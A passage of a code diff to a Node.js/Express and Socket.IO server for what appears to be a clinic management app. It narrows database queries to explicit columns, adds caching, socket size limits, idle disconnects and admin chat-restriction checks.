+      let query = `SELECT ${columns} FROM DailyExpenses ${whereClause} ORDER BY Date DESC, CreatedAt DESC`;
       let queryParams = [...params];
 
       if (limit !== -1) {
@@ -3876,9 +4056,10 @@ app.post('/api/patient-services', async (req, res) => {
   });
 
   // --- Employees ---
-  app.get('/api/employees', async (req, res) => {
+  app.get('/api/employees', cacheMiddleware, async (req, res) => {
     try {
-      const [rows] = await pool.query('SELECT * FROM Employees ORDER BY CreatedAt DESC');
+      const columns = 'ID, UserID, Name, Designation, Phone, Status, JoiningDate, BasicSalary, CreatedAt';
+      const [rows] = await pool.query(`SELECT ${columns} FROM Employees ORDER BY CreatedAt DESC`);
       res.json(rows.map(convertRowDates));
     } catch (error) {
       res.status(500).json({ error: error.message });
@@ -3940,7 +4121,8 @@ app.post('/api/patient-services', async (req, res) => {
         params.push(startDate, endDate);
       }
 
-      const [rows] = await pool.query(`SELECT * FROM Attendance ${whereClause} ORDER BY Date DESC`, params);
+      const columns = 'ID, EmployeeID, Date, Status, CheckIn, CheckOut';
+      const [rows] = await pool.query(`SELECT ${columns} FROM Attendance ${whereClause} ORDER BY Date DESC`, params);
       res.json(rows.map(convertRowDates));
     } catch (error) {
       res.status(500).json({ error: error.message });
@@ -4015,7 +4197,8 @@ app.post('/api/patient-services', async (req, res) => {
         whereClause += ' AND Status = ?';
         params.push(status);
       }
-      const [rows] = await pool.query(`SELECT * FROM LeaveRequests ${whereClause} ORDER BY CreatedAt DESC`, params);
+      const columns = 'ID, EmployeeID, StartDate, EndDate, Status, CreatedAt';
+      const [rows] = await pool.query(`SELECT ${columns} FROM LeaveRequests ${whereClause} ORDER BY CreatedAt DESC`, params);
       res.json(rows.map(convertRowDates));
     } catch (error) {
       res.status(500).json({ error: error.message });
@@ -4093,7 +4276,8 @@ app.post('/api/patient-services', async (req, res) => {
         whereClause += ' AND Status = ?';
         params.push(status);
       }
-      const [rows] = await pool.query(`SELECT * FROM AdvancePayments ${whereClause} ORDER BY Date DESC`, params);
+      const columns = 'ID, EmployeeID, Date, Amount, Status, ApprovedBy, ApprovalTime';
+      const [rows] = await pool.query(`SELECT ${columns} FROM AdvancePayments ${whereClause} ORDER BY Date DESC`, params);
       const converted = rows.map(convertRowDates);
       if (converted.length > 0) console.log('DEBUG: First Advance Row:', JSON.stringify(converted[0], null, 2));
       res.json(converted);
@@ -4150,7 +4334,8 @@ app.post('/api/patient-services', async (req, res) => {
         whereClause += ' AND Month = ? AND Year = ?';
         params.push(month, year);
       }
-      const [rows] = await pool.query(`SELECT * FROM Payroll ${whereClause} ORDER BY CreatedAt DESC`, params);
+      const columns = 'ID, EmployeeID, Month, Year, NetSalary, PaymentStatus, CreatedAt';
+      const [rows] = await pool.query(`SELECT ${columns} FROM Payroll ${whereClause} ORDER BY CreatedAt DESC`, params);
       res.json(rows.map(convertRowDates));
     } catch (error) {
       res.status(500).json({ error: error.message });
@@ -4158,9 +4343,9 @@ app.post('/api/patient-services', async (req, res) => {
   });
 
   // Salary Config endpoints
-  app.get('/api/hr/salary-config', async (req, res) => {
+  app.get('/api/hr/salary-config', cacheMiddleware, async (req, res) => {
     try {
-      const [rows] = await pool.execute("SELECT Data FROM AppSettings WHERE ID = 'SALARY_CONFIG'");
+      const [rows] = await pool.execute("SELECT ID, Category, Data FROM AppSettings WHERE ID = 'SALARY_CONFIG'");
       if (rows.length > 0) {
         const config = typeof rows[0].Data === 'string' ? JSON.parse(rows[0].Data) : rows[0].Data;
         res.json(config);
@@ -4482,8 +4667,9 @@ app.post('/api/patient-services', async (req, res) => {
         params.push(`%${search}%`, `%${search}%`);
       }
 
+      const columns = 'ID, PatientID, PatientName, Phone, ApptDate, ApptTime, Status, TokenNumber';
       const [rows] = await pool.query(
-        `SELECT * FROM Appointments ${whereClause} ORDER BY TokenNumber ASC, ApptTime ASC`,
+        `SELECT ${columns} FROM Appointments ${whereClause} ORDER BY TokenNumber ASC, ApptTime ASC`,
         params
       );
 
@@ -4820,13 +5006,17 @@ app.post('/api/patient-services', async (req, res) => {
       methods: ["GET", "POST"],
       credentials: true
     },
-    transports: ['websocket', 'polling']
+    transports: ['websocket', 'polling'],
+    maxHttpBufferSize: 1e6, // Limit message size (1MB) to prevent OOM
+    pingTimeout: 30000,
+    pingInterval: 10000
   });
 
   app.set('io', io);
 
-  // Presence Tracking: UserID -> { socketId, isOnChatPage, lastChatActivity }
+  // Presence Tracking: UserID -> { socketId, isOnChatPage, lastChatActivity, hasWarnedInactivity }
   const userSocketMap = new Map();
+  const IDLE_TIMEOUT_MS = 600000; // 10 minutes - Force disconnect after this
 
   function broadcastOnlineUsers() {
     const now = Date.now();
@@ -4834,19 +5024,29 @@ app.post('/api/patient-services', async (req, res) => {
     
     for (const [userId, info] of userSocketMap.entries()) {
       const diff = now - info.lastChatActivity;
-      const wasRecentlyActive = diff < 120000; // 2 minutes
+      
+      // Force disconnect truly idle users to save shared hosting resources
+      if (diff > IDLE_TIMEOUT_MS) {
+        const socket = io.sockets.sockets.get(info.socketId);
+        if (socket) {
+          console.log(`🔌 [AUTO-DISCONNECT] User ${userId} due to 10m inactivity`);
+          socket.emit('force-disconnect', { reason: 'Inactivity timeout' });
+          socket.disconnect(true);
+        }
+        continue;
+      }
 
+      const wasRecentlyActive = diff < 120000; // 2 minutes for "Online" status
       if (wasRecentlyActive) {
         onlineUserIds.push(userId);
-        info.hasWarnedInactivity = false; // Reset flag when active
+        info.hasWarnedInactivity = false;
       } else {
-        // If they just crossed the 2-min mark, update their "Last Seen" in DB once
         if (!info.hasWarnedInactivity) {
           const lastActiveDate = new Date(info.lastChatActivity).toISOString();
-          pool.execute('UPDATE Users SET LastLogin = ? WHERE ID = ?', [lastActiveDate, userId]).catch(err => {
-            console.error('❌ Failed to update LastLogin on inactivity:', err);
-          });
-          info.hasWarnedInactivity = true; // Prevent constant DB writes
+          if (pool) {
+            pool.execute('UPDATE Users SET LastLogin = ? WHERE ID = ?', [lastActiveDate, userId]).catch(() => {});
+          }
+          info.hasWarnedInactivity = true;
         }
       }
     }
@@ -4854,10 +5054,8 @@ app.post('/api/patient-services', async (req, res) => {
     io.emit('online-users', onlineUserIds);
   }
 
-  // Every 60 seconds, check for inactive users and re-broadcast
-  setInterval(() => {
-    broadcastOnlineUsers();
-  }, 60000);
+  // Check every 60 seconds
+  setInterval(broadcastOnlineUsers, 60000);
 
   // Socket Auth Middleware
   io.use((socket, next) => {
@@ -4881,10 +5079,14 @@ app.post('/api/patient-services', async (req, res) => {
       lastChatActivity: Date.now() // Start active
     });
 
-    // Update LastLogin in database
-    pool.execute('UPDATE Users SET LastLogin = ? WHERE ID = ?', [new Date().toISOString(), userId]).catch(err => {
-      console.error('❌ Failed to update LastLogin:', err);
-    });
+    // Update LastLogin in database - with safety check
+    if (pool) {
+      pool.execute('UPDATE Users SET LastLogin = ? WHERE ID = ?', [new Date().toISOString(), userId]).catch(err => {
+        console.error('❌ Failed to update LastLogin:', err);
+      });
+    } else {
+      console.warn('⚠️ Database pool not initialized yet, skipping LastLogin update');
+    }
 
     console.log(`💬 Chat: User ${socket.user.username} connected (${userId})`);
     broadcastOnlineUsers();
@@ -4902,6 +5104,29 @@ app.post('/api/patient-services', async (req, res) => {
       const roomName = `room_${conversationId}`;
 
       try {
+        // 0. Check for Admin-only Chat Restriction
+        const [settingsRows] = await pool.query("SELECT Data FROM AppSettings WHERE ID = 'GLOBAL'");
+        if (settingsRows.length > 0) {
+          const globalData = typeof settingsRows[0].Data === 'string' ? JSON.parse(settingsRows[0].Data) : settingsRows[0].Data;
+          if (globalData.isChatRestricted && socket.user.role !== 'Admin') {
+            return socket.emit('error', { 
+              message: 'Chat is currently restricted by Admin. Only administrators can send messages.' 
+            });
+          }
+        }
+
+        // 0.1 Check for Conversation-specific Block
+        const [convRows] = await pool.query("SELECT IsBlocked FROM ChatConversations WHERE ID = ?", [Number(conversationId)]);
+        if (convRows.length > 0 && convRows[0].IsBlocked) {
+          // Admin can still send messages even if conversation is blocked
+          if (socket.user.role !== 'Admin') {
+            return socket.emit('error', { 
+              message: 'This conversation is blocked by Admin. You cannot send messages.' 
+            });
+          }
+        }
+
+        // Ensure sender is in the room
         // Ensure sender is in the room
         socket.join(roomName);
 
@@ -4921,7 +5146,13 @@ app.post('/api/patient-services', async (req, res) => {
           isRead: 0
         };
 
-        // 2. Emit to everyone in the room
+        // 2. Update Conversation metadata for faster sidebar loading
+        await pool.execute(
+          'UPDATE ChatConversations SET LastMessage = ?, LastMessageAt = ?, UpdatedAt = ? WHERE ID = ?',
+          [content.substring(0, 500), now, now, Number(conversationId)]
+        );
+
+        // 3. Emit to everyone in the room
         io.to(roomName).emit('new-message', newMessage);
 
         // 3. Global notification for receiver
@@ -4973,11 +5204,13 @@ app.post('/api/patient-services', async (req, res) => {
 
     socket.on('disconnect', () => {
       const info = userSocketMap.get(userId);
-      // Final update to database on disconnect
+      // Final update to database on disconnect - with safety check
       const now = new Date().toISOString();
-      pool.execute('UPDATE Users SET LastLogin = ? WHERE ID = ?', [now, userId]).catch(err => {
-        console.error('❌ Failed to update LastLogin on disconnect:', err);
-      });
+      if (pool) {
+        pool.execute('UPDATE Users SET LastLogin = ? WHERE ID = ?', [now, userId]).catch(err => {
+          console.error('❌ Failed to update LastLogin on disconnect:', err);
+        });
+      }
 
       userSocketMap.delete(userId);
       console.log(`💬 Chat: User ${socket.user.username} disconnected`);
